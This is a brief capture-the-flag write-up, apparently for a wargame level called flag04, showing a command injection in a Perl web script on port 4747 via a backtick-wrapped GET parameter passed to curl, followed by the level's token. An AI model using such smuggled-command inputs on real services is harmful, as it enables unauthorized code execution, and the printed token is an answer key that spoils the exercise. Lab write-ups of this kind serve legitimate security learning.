You can see a perl script in the home, and that the script is running in background on the :4747 port
You can either curl or do a ssh bridge with `-L 4747:localhost:4747`

By looking into the perl script you can see that they use the http module and print the "x" get params and echo it with the system echo so you can exploit it as follow, because it's launched with the flag04 user

`curl localhost:4747?x=\`getflag\``

`Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap`
